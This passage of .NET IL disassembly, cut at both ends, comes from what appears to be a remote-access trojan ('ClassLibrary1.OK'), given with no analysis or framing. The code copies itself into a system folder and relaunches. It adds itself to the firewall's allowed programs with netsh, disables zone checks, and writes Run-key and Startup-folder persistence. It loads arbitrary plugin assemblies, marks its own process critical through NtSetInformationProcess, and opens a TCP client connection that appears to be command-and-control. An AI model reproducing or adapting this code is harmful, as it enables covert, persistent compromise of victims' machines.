      IL_02f9:  ldsfld     string ClassLibrary1.OK::Y
      IL_02fe:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0303:  stloc.1
      IL_0304:  nop
      IL_0305:  leave.s    IL_0335

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0307:  dup
      IL_0308:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030d:  stloc.s    V_14
      IL_030f:  nop
      IL_0310:  ldloc.s    V_14
      IL_0312:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0317:  nop
      IL_0318:  ldloc.s    V_14
      IL_031a:  stloc.s    V_15
      IL_031c:  ldloc.1
      IL_031d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0322:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0327:  stloc.1
      IL_0328:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032d:  nop
      IL_032e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0333:  leave.s    IL_0335

    }  // end handler
    IL_0335:  nop
    IL_0336:  call       bool ClassLibrary1.OK::Cam()
    IL_033b:  stloc.s    V_24
    IL_033d:  ldloc.s    V_24
    IL_033f:  brfalse.s  IL_0354

    IL_0341:  ldloc.1
    IL_0342:  ldstr      "Yes"
    IL_0347:  ldsfld     string ClassLibrary1.OK::Y
    IL_034c:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0351:  stloc.1
    IL_0352:  br.s       IL_0366

    IL_0354:  nop
    IL_0355:  ldloc.1
    IL_0356:  ldstr      "No"
    IL_035b:  ldsfld     string ClassLibrary1.OK::Y
    IL_0360:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0365:  stloc.1
    IL_0366:  nop
    IL_0367:  ldc.i4.7
    IL_0368:  newarr     [mscorlib]System.String
    IL_036d:  stloc.s    V_21
    IL_036f:  ldloc.s    V_21
    IL_0371:  ldc.i4.0
    IL_0372:  ldloc.1
    IL_0373:  stelem.ref
    IL_0374:  nop
    IL_0375:  ldloc.s    V_21
    IL_0377:  ldc.i4.1
    IL_0378:  ldsfld     string ClassLibrary1.OK::VR
    IL_037d:  stelem.ref
    IL_037e:  nop
    IL_037f:  ldloc.s    V_21
    IL_0381:  ldc.i4.2
    IL_0382:  ldsfld     string ClassLibrary1.OK::Y
    IL_0387:  stelem.ref
    IL_0388:  nop
    IL_0389:  ldloc.s    V_21
    IL_038b:  ldc.i4.3
    IL_038c:  ldstr      ".."
    IL_0391:  stelem.ref
    IL_0392:  nop
    IL_0393:  ldloc.s    V_21
    IL_0395:  ldc.i4.4
    IL_0396:  ldsfld     string ClassLibrary1.OK::Y
    IL_039b:  stelem.ref
    IL_039c:  nop
    IL_039d:  ldloc.s    V_21
    IL_039f:  ldc.i4.5
    IL_03a0:  call       string ClassLibrary1.OK::ACT()
    IL_03a5:  stelem.ref
    IL_03a6:  nop
    IL_03a7:  ldloc.s    V_21
    IL_03a9:  ldc.i4.6
    IL_03aa:  ldsfld     string ClassLibrary1.OK::Y
    IL_03af:  stelem.ref
    IL_03b0:  nop
    IL_03b1:  ldloc.s    V_21
    IL_03b3:  call       string [mscorlib]System.String::Concat(string[])
    IL_03b8:  stloc.1
    IL_03b9:  ldstr      ""
    IL_03be:  stloc.2
    IL_03bf:  nop
    .try
    {
      IL_03c0:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_03c5:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03ca:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03cf:  ldstr      "Software\\"
      IL_03d4:  ldsfld     string ClassLibrary1.OK::RG
      IL_03d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03de:  ldc.i4.0
      IL_03df:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03e4:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03e9:  stloc.s    V_23
      IL_03eb:  ldc.i4.0
      IL_03ec:  stloc.s    V_22
      IL_03ee:  br.s       IL_041e

      IL_03f0:  ldloc.s    V_23
      IL_03f2:  ldloc.s    V_22
      IL_03f4:  ldelem.ref
      IL_03f5:  stloc.s    V_16
      IL_03f7:  ldloc.s    V_16
      IL_03f9:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03fe:  ldc.i4.s   32
      IL_0400:  ceq
      IL_0402:  stloc.s    V_24
      IL_0404:  ldloc.s    V_24
      IL_0406:  brfalse.s  IL_0416

      IL_0408:  ldloc.2
      IL_0409:  ldloc.s    V_16
      IL_040b:  ldstr      ","
      IL_0410:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0415:  stloc.2
      IL_0416:  nop
      IL_0417:  ldloc.s    V_22
      IL_0419:  ldc.i4.1
      IL_041a:  add.ovf
      IL_041b:  stloc.s    V_22
      IL_041d:  nop
      IL_041e:  ldloc.s    V_22
      IL_0420:  ldloc.s    V_23
      IL_0422:  ldlen
      IL_0423:  conv.ovf.i4
      IL_0424:  clt
      IL_0426:  stloc.s    V_24
      IL_0428:  ldloc.s    V_24
      IL_042a:  brtrue.s   IL_03f0

      IL_042c:  leave.s    IL_0450

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_042e:  dup
      IL_042f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0434:  stloc.s    V_17
      IL_0436:  nop
      IL_0437:  ldloc.s    V_17
      IL_0439:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_043e:  nop
      IL_043f:  ldloc.s    V_17
      IL_0441:  stloc.s    V_18
      IL_0443:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0448:  nop
      IL_0449:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_044e:  leave.s    IL_0450

    }  // end handler
    IL_0450:  nop
    IL_0451:  ldloc.1
    IL_0452:  ldloc.2
    IL_0453:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0458:  stloc.0
    IL_0459:  br.s       IL_045b

    IL_045b:  ldloc.0
    IL_045c:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       792 (0x318)
    .maxstack  5
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             string[] V_12,
             bool V_13,
             bool V_14)
    IL_0000:  nop
    IL_0001:  ldsfld     bool ClassLibrary1.OK::Idr
    IL_0006:  brfalse.s  IL_003c

    IL_0008:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_000d:  ldsfld     string ClassLibrary1.OK::DR
    IL_0012:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0017:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_001c:  ldstr      "\\"
    IL_0021:  ldsfld     string ClassLibrary1.OK::EXE
    IL_0026:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_002b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0030:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0035:  call       bool ClassLibrary1.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                                        class [mscorlib]System.IO.FileInfo)
    IL_003a:  brfalse.s  IL_003f

    IL_003c:  ldc.i4.0
    IL_003d:  br.s       IL_0040

    IL_003f:  ldc.i4.1
    IL_0040:  stloc.s    V_13
    IL_0042:  ldloc.s    V_13
    IL_0044:  brfalse    IL_0104

    IL_0049:  nop
    .try
    {
      IL_004a:  ldsfld     string ClassLibrary1.OK::DR
      IL_004f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0054:  ldstr      "\\"
      IL_0059:  ldsfld     string ClassLibrary1.OK::EXE
      IL_005e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0063:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0068:  stloc.s    V_14
      IL_006a:  ldloc.s    V_14
      IL_006c:  brfalse.s  IL_008d

      IL_006e:  ldsfld     string ClassLibrary1.OK::DR
      IL_0073:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0078:  ldstr      "\\"
      IL_007d:  ldsfld     string ClassLibrary1.OK::EXE
      IL_0082:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0087:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_008c:  nop
      IL_008d:  nop
      IL_008e:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0093:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0098:  ldsfld     string ClassLibrary1.OK::DR
      IL_009d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00a2:  ldstr      "\\"
      IL_00a7:  ldsfld     string ClassLibrary1.OK::EXE
      IL_00ac:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b1:  ldc.i4.1
      IL_00b2:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_00b7:  nop
      IL_00b8:  ldsfld     string ClassLibrary1.OK::DR
      IL_00bd:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00c2:  ldstr      "\\"
      IL_00c7:  ldsfld     string ClassLibrary1.OK::EXE
      IL_00cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00d1:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_00d6:  pop
      IL_00d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00dc:  nop
      IL_00dd:  leave.s    IL_0103

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00df:  dup
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e5:  stloc.1
      IL_00e6:  nop
      IL_00e7:  ldloc.1
      IL_00e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ed:  nop
      IL_00ee:  ldloc.1
      IL_00ef:  stloc.0
      IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00f5:  nop
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00fb:  nop
      IL_00fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0101:  leave.s    IL_0103

    }  // end handler
    IL_0103:  nop
    IL_0104:  nop
    IL_0105:  nop
    .try
    {
      IL_0106:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_010b:  ldstr      "1"
      IL_0110:  ldc.i4.1
      IL_0111:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0116:  nop
      IL_0117:  leave.s    IL_0137

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0119:  dup
      IL_011a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_011f:  stloc.3
      IL_0120:  nop
      IL_0121:  ldloc.3
      IL_0122:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0127:  nop
      IL_0128:  ldloc.3
      IL_0129:  stloc.2
      IL_012a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012f:  nop
      IL_0130:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0135:  leave.s    IL_0137

    }  // end handler
    IL_0137:  nop
    IL_0138:  nop
    .try
    {
      IL_0139:  ldc.i4.5
      IL_013a:  newarr     [mscorlib]System.String
      IL_013f:  stloc.s    V_12
      IL_0141:  ldloc.s    V_12
      IL_0143:  ldc.i4.0
      IL_0144:  ldstr      "netsh firewall add allowedprogram \""
      IL_0149:  stelem.ref
      IL_014a:  nop
      IL_014b:  ldloc.s    V_12
      IL_014d:  ldc.i4.1
      IL_014e:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0153:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0158:  stelem.ref
      IL_0159:  nop
      IL_015a:  ldloc.s    V_12
      IL_015c:  ldc.i4.2
      IL_015d:  ldstr      "\" \""
      IL_0162:  stelem.ref
      IL_0163:  nop
      IL_0164:  ldloc.s    V_12
      IL_0166:  ldc.i4.3
      IL_0167:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_016c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0171:  stelem.ref
      IL_0172:  nop
      IL_0173:  ldloc.s    V_12
      IL_0175:  ldc.i4.4
      IL_0176:  ldstr      "\" ENABLE"
      IL_017b:  stelem.ref
      IL_017c:  nop
      IL_017d:  ldloc.s    V_12
      IL_017f:  call       string [mscorlib]System.String::Concat(string[])
      IL_0184:  ldc.i4.0
      IL_0185:  ldc.i4.0
      IL_0186:  ldc.i4.m1
      IL_0187:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_018c:  pop
      IL_018d:  leave.s    IL_01b1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018f:  dup
      IL_0190:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0195:  stloc.s    V_5
      IL_0197:  nop
      IL_0198:  ldloc.s    V_5
      IL_019a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019f:  nop
      IL_01a0:  ldloc.s    V_5
      IL_01a2:  stloc.s    V_4
      IL_01a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a9:  nop
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  leave.s    IL_01b1

    }  // end handler
    IL_01b1:  nop
    IL_01b2:  ldsfld     bool ClassLibrary1.OK::Isu
    IL_01b7:  stloc.s    V_14
    IL_01b9:  ldloc.s    V_14
    IL_01bb:  brfalse    IL_0288

    IL_01c0:  nop
    .try
    {
      IL_01c1:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_01c6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01cb:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01d0:  ldsfld     string ClassLibrary1.OK::sf
      IL_01d5:  ldc.i4.1
      IL_01d6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01db:  ldsfld     string ClassLibrary1.OK::RG
      IL_01e0:  ldstr      "\""
      IL_01e5:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_01ea:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01ef:  ldstr      "\" .."
      IL_01f4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01f9:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01fe:  nop
      IL_01ff:  leave.s    IL_0223

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0201:  dup
      IL_0202:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0207:  stloc.s    V_7
      IL_0209:  nop
      IL_020a:  ldloc.s    V_7
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  nop
      IL_0212:  ldloc.s    V_7
      IL_0214:  stloc.s    V_6
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  nop
      IL_021c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0221:  leave.s    IL_0223

    }  // end handler
    IL_0223:  nop
    IL_0224:  nop
    .try
    {
      IL_0225:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_022a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_022f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0234:  ldsfld     string ClassLibrary1.OK::sf
      IL_0239:  ldc.i4.1
      IL_023a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_023f:  ldsfld     string ClassLibrary1.OK::RG
      IL_0244:  ldstr      "\""
      IL_0249:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_024e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0253:  ldstr      "\" .."
      IL_0258:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_025d:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0262:  nop
      IL_0263:  leave.s    IL_0287

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0265:  dup
      IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_026b:  stloc.s    V_8
      IL_026d:  nop
      IL_026e:  ldloc.s    V_8
      IL_0270:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0275:  nop
      IL_0276:  ldloc.s    V_8
      IL_0278:  stloc.s    V_9
      IL_027a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_027f:  nop
      IL_0280:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0285:  leave.s    IL_0287

    }  // end handler
    IL_0287:  nop
    IL_0288:  nop
    IL_0289:  ldsfld     bool ClassLibrary1.OK::IsF
    IL_028e:  stloc.s    V_14
    IL_0290:  ldloc.s    V_14
    IL_0292:  brfalse.s  IL_030a

    IL_0294:  nop
    .try
    {
      IL_0295:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_029a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029f:  ldc.i4.7
      IL_02a0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02a5:  ldstr      "\\"
      IL_02aa:  ldsfld     string ClassLibrary1.OK::RG
      IL_02af:  ldstr      ".exe"
      IL_02b4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02b9:  ldc.i4.1
      IL_02ba:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_02bf:  nop
      IL_02c0:  ldc.i4.7
      IL_02c1:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02c6:  ldstr      "\\"
      IL_02cb:  ldsfld     string ClassLibrary1.OK::RG
      IL_02d0:  ldstr      ".exe"
      IL_02d5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02da:  ldc.i4.3
      IL_02db:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_02e0:  stsfld     class [mscorlib]System.IO.FileStream ClassLibrary1.OK::FS
      IL_02e5:  leave.s    IL_0309

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e7:  dup
      IL_02e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02ed:  stloc.s    V_10
      IL_02ef:  nop
      IL_02f0:  ldloc.s    V_10
      IL_02f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f7:  nop
      IL_02f8:  ldloc.s    V_10
      IL_02fa:  stloc.s    V_11
      IL_02fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0301:  nop
      IL_0302:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0307:  leave.s    IL_0309

    }  // end handler
    IL_0309:  nop
    IL_030a:  nop
    IL_030b:  ldc.i4     0x3e8
    IL_0310:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0315:  nop
    IL_0316:  nop
    IL_0317:  ret
  } // end of method OK::INS

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] ByteOfPlugin,
                                       string ClassName) cil managed
  {
    // Code size       136 (0x88)
    .maxstack  3
    .locals init (class [mscorlib]System.Reflection.Module V_0,
             object V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0007:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000c:  stloc.s    V_4
    IL_000e:  ldc.i4.0
    IL_000f:  stloc.3
    IL_0010:  br.s       IL_0075

    IL_0012:  ldloc.s    V_4
    IL_0014:  ldloc.3
    IL_0015:  ldelem.ref
    IL_0016:  stloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001d:  stloc.s    V_6
    IL_001f:  ldc.i4.0
    IL_0020:  stloc.s    V_5
    IL_0022:  br.s       IL_0062

    IL_0024:  ldloc.s    V_6
    IL_0026:  ldloc.s    V_5
    IL_0028:  ldelem.ref
    IL_0029:  stloc.2
    IL_002a:  ldloc.2
    IL_002b:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0030:  ldstr      "."
    IL_0035:  ldarg.1
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_0040:  stloc.s    V_7
    IL_0042:  ldloc.s    V_7
    IL_0044:  brfalse.s  IL_005a

    IL_0046:  ldloc.0
    IL_0047:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_004c:  ldloc.2
    IL_004d:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0052:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0057:  stloc.1
    IL_0058:  br.s       IL_0086

    IL_005a:  nop
    IL_005b:  ldloc.s    V_5
    IL_005d:  ldc.i4.1
    IL_005e:  add.ovf
    IL_005f:  stloc.s    V_5
    IL_0061:  nop
    IL_0062:  ldloc.s    V_5
    IL_0064:  ldloc.s    V_6
    IL_0066:  ldlen
    IL_0067:  conv.ovf.i4
    IL_0068:  clt
    IL_006a:  stloc.s    V_7
    IL_006c:  ldloc.s    V_7
    IL_006e:  brtrue.s   IL_0024

    IL_0070:  ldloc.3
    IL_0071:  ldc.i4.1
    IL_0072:  add.ovf
    IL_0073:  stloc.3
    IL_0074:  nop
    IL_0075:  ldloc.3
    IL_0076:  ldloc.s    V_4
    IL_0078:  ldlen
    IL_0079:  conv.ovf.i4
    IL_007a:  clt
    IL_007c:  stloc.s    V_7
    IL_007e:  ldloc.s    V_7
    IL_0080:  brtrue.s   IL_0012

    IL_0082:  ldnull
    IL_0083:  stloc.1
    IL_0084:  br.s       IL_0086

    IL_0086:  ldloc.1
    IL_0087:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       58 (0x3a)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0007:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000c:  ldc.i4.s   29
      IL_000e:  ldarga.s   i
      IL_0010:  ldc.i4.4
      IL_0011:  call       int32 ClassLibrary1.OK::NtSetInformationProcess(native int,
                                                                           int32,
                                                                           int32&,
                                                                           int32)
      IL_0016:  pop
      IL_0017:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  dup
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  stloc.1
      IL_0020:  nop
      IL_0021:  ldloc.1
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  nop
      IL_0028:  ldloc.1
      IL_0029:  stloc.0
      IL_002a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002f:  nop
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  nop
    IL_0038:  nop
    IL_0039:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       629 (0x275)
    .maxstack  10
    .locals init (int32 V_0,
             int32 V_1,
             class [mscorlib]System.Array V_2,
             class [mscorlib]System.Threading.Thread V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             uint8[] V_6,
             object[] V_7,
             object[] V_8,
             bool V_9)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  nop
    IL_0003:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
    IL_0008:  ldnull
    IL_0009:  ceq
    IL_000b:  ldc.i4.0
    IL_000c:  ceq
    IL_000e:  stloc.s    V_9
    IL_0010:  ldloc.s    V_9
    IL_0012:  brfalse    IL_0243

    IL_0017:  nop
    .try
    {
      IL_0018:  nop
      IL_0019:  nop
      IL_001a:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_001f:  ldc.i4.0
      IL_0020:  ceq
